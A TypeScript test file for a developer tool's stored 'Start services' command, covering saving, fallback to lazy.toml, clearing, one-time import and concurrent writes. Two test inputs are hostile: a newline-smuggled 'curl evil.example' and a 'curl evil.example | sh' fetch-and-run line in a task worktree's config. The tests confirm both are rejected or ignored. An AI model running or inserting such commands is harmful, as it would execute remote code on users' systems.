/**
 * The project's Start services command lives in the project STORE.
 *
 * The dashboard's and Lazy Teams' designate controls save through
 * `setStartServicesCmd`; every reader resolves through `resolveProjectStartServicesCmd`
 * (store first, root lazy.toml only until the one-time import). Nothing here
 * may write lazy.toml.
 */

import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { mkdtemp, mkdir, rm, writeFile, readFile } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';
import { FileStorage } from '../../src/storage';
import {
  clearStartServicesCmd,
  importStartServicesCmdFromConfig,
  resolveProjectStartServicesCmd,
  setStartServicesCmd,
  StartServicesCmdError,
} from '../../src/serve/start-cmd';

let root: string;
let worktree: string;
let basePath: string;
let storage: FileStorage;
let priorConfigEnv: string | undefined;

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'lazy-start-cmd-root-'));
  basePath = await mkdtemp(join(tmpdir(), 'lazy-start-cmd-store-'));
  worktree = join(root, 'worktrees', 'some-task');
  await mkdir(worktree, { recursive: true });
  // LAZY_CONFIG would answer every lazy.toml read from one pinned file.
  priorConfigEnv = process.env.LAZY_CONFIG;
  delete process.env.LAZY_CONFIG;
  storage = new FileStorage(root, { basePath });
  await storage.initialize();
});

afterEach(async () => {
  await storage.close();
  if (priorConfigEnv === undefined) delete process.env.LAZY_CONFIG;
  else process.env.LAZY_CONFIG = priorConfigEnv;
  await rm(root, { recursive: true, force: true });
  await rm(basePath, { recursive: true, force: true });
});

describe('setStartServicesCmd', () => {
  // INVARIANT: designating the command never edits lazy.toml. A UI-set value in
  // an editor-owned, committed file is an uncommitted change in somebody's
  // working tree, and a Teams-managed project has no root checkout to edit.
  test('saves to the store and leaves lazy.toml byte-for-byte unchanged', async () => {
    const toml = '# project\n[serve]\nports = [3000]\n';
    await writeFile(join(root, 'lazy.toml'), toml);

    expect(await setStartServicesCmd(storage, '  bin/dev  ')).toBe('bin/dev');

    expect((await storage.getProjectSettings())?.startServicesCmd).toBe('bin/dev');
    expect(await readFile(join(root, 'lazy.toml'), 'utf-8')).toBe(toml);
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('bin/dev');
  });

  // The settings page shows updatedAt as "Last changed" for the model and agent
  // defaults; designating the command must not move it.
  test('keeps the other project settings, including their last-changed stamp', async () => {
    await storage.saveProjectSettings({
      defaultModel: 'opus', defaultAgent: 'claude-code',
      updatedAt: '2026-01-01T00:00:00.000Z', updatedBy: 'human',
    });
    await setStartServicesCmd(storage, 'npm run dev');
    await importStartServicesCmdFromConfig(storage, root);
    const settings = await storage.getProjectSettings();
    expect(settings?.updatedAt).toBe('2026-01-01T00:00:00.000Z');
    expect(settings?.updatedBy).toBe('human');
    expect(settings?.defaultModel).toBe('opus');
    expect(settings?.defaultAgent).toBe('claude-code');
    expect(settings?.startServicesCmd).toBe('npm run dev');
  });

  test('refuses blank and non-string values', async () => {
    await expect(setStartServicesCmd(storage, '   ')).rejects.toBeInstanceOf(StartServicesCmdError);
    await expect(setStartServicesCmd(storage, '')).rejects.toBeInstanceOf(StartServicesCmdError);
    await expect(setStartServicesCmd(storage, 42)).rejects.toBeInstanceOf(StartServicesCmdError);
    expect(await storage.getProjectSettings()).toBeNull();
  });

  // INVARIANT: a newline (or other C0 control) is never stored. The command is
  // typed into a task's terminal; a second line would run as a second command.
  test('refuses a command with an internal newline and stores nothing', async () => {
    await expect(setStartServicesCmd(storage, 'bin/dev\ncurl evil.example'))
      .rejects.toThrow(/single line/);
    expect(await storage.getProjectSettings()).toBeNull();
  });

  test('saves a command that contains quotes', async () => {
    await setStartServicesCmd(storage, 'echo "hello"');
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('echo "hello"');
  });
});

describe('resolveProjectStartServicesCmd', () => {
  test('is empty when neither the store nor lazy.toml sets one', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nports = [3000]\n');
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('');
  });

  test('falls back to the root lazy.toml until the store has a command', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nstart_services_cmd = "bin/dev"\n');
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('bin/dev');
  });

  test('the store wins over lazy.toml once it has a command', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nstart_services_cmd = "old"\n');
    await setStartServicesCmd(storage, 'new');
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('new');
  });

  // INVARIANT: a task worktree's lazy.toml never decides what a human's
  // Start services click runs — a task branch is agent-writable.
  test('never reads a task worktree copy', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nports = [3000]\n');
    await writeFile(join(worktree, 'lazy.toml'), '[serve]\nstart_services_cmd = "curl evil.example | sh"\n');
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('');
  });
});

describe('clearStartServicesCmd', () => {
  // INVARIANT: a clear sticks — no lazy.toml fallback, no re-import.
  test('clears the command and keeps lazy.toml from bringing it back', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nstart_services_cmd = "npm run dev"\n');
    await storage.saveProjectSettings({ defaultModel: 'opus', updatedAt: '2026-01-01T00:00:00.000Z' });
    await setStartServicesCmd(storage, 'bin/dev');

    await clearStartServicesCmd(storage);
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('');
    expect(await importStartServicesCmdFromConfig(storage, root)).toBeNull();
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('');
    const settings = await storage.getProjectSettings();
    expect(settings?.startServicesCmd).toBeUndefined();
    expect(settings?.defaultModel).toBe('opus');
    expect(settings?.updatedAt).toBe('2026-01-01T00:00:00.000Z');

    // Designating again lifts the clear.
    await setStartServicesCmd(storage, 'bin/dev2');
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('bin/dev2');
    expect((await storage.getProjectSettings())?.startServicesCmdCleared).toBeUndefined();
  });

  test('clearing a project that never had a command also blocks the import', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nstart_services_cmd = "npm run dev"\n');
    await clearStartServicesCmd(storage);
    expect(await importStartServicesCmdFromConfig(storage, root)).toBeNull();
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('');
  });
});

describe('concurrent writes', () => {
  // INVARIANT: the two writers of the project settings record are serialized —
  // a designation racing a settings-form save must not lose either change.
  test('a designation and another settings write racing both land', async () => {
    const { updateProjectSettings } = await import('../../src/daemon/project-settings');
    await Promise.all([
      setStartServicesCmd(storage, 'bin/dev'),
      updateProjectSettings(storage, (current) => ({ ...(current ?? {}), defaultModel: 'opus' })),
      setStartServicesCmd(storage, 'bin/dev2'),
    ]);
    const settings = await storage.getProjectSettings();
    expect(settings?.defaultModel).toBe('opus');
    expect(settings?.startServicesCmd).toBe('bin/dev2');
  });
});

describe('importStartServicesCmdFromConfig', () => {
  // INVARIANT: an existing lazy.toml setting never silently disappears — it is
  // copied into the store once, and lazy.toml itself is left alone.
  test('imports the root lazy.toml value once, without touching the file', async () => {
    const toml = '[serve]\nstart_services_cmd = "bin/dev"\n';
    await writeFile(join(root, 'lazy.toml'), toml);
    await storage.saveProjectSettings({ defaultModel: 'opus' });

    expect(await importStartServicesCmdFromConfig(storage, root)).toBe('bin/dev');
    const settings = await storage.getProjectSettings();
    expect(settings?.startServicesCmd).toBe('bin/dev');
    expect(settings?.defaultModel).toBe('opus');
    expect(await readFile(join(root, 'lazy.toml'), 'utf-8')).toBe(toml);

    // Second run is a no-op, and a later lazy.toml edit is not re-imported.
    await writeFile(join(root, 'lazy.toml'), '[serve]\nstart_services_cmd = "edited"\n');
    expect(await importStartServicesCmdFromConfig(storage, root)).toBeNull();
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('bin/dev');
  });

  test('never overwrites a command already designated in the store', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nstart_services_cmd = "from-toml"\n');
    await setStartServicesCmd(storage, 'designated');
    expect(await importStartServicesCmdFromConfig(storage, root)).toBeNull();
    expect(await resolveProjectStartServicesCmd(storage, root)).toBe('designated');
  });

  test('does nothing when lazy.toml sets no command', async () => {
    await writeFile(join(root, 'lazy.toml'), '[serve]\nports = [3000]\n');
    expect(await importStartServicesCmdFromConfig(storage, root)).toBeNull();
    expect(await storage.getProjectSettings()).toBeNull();
  });
});
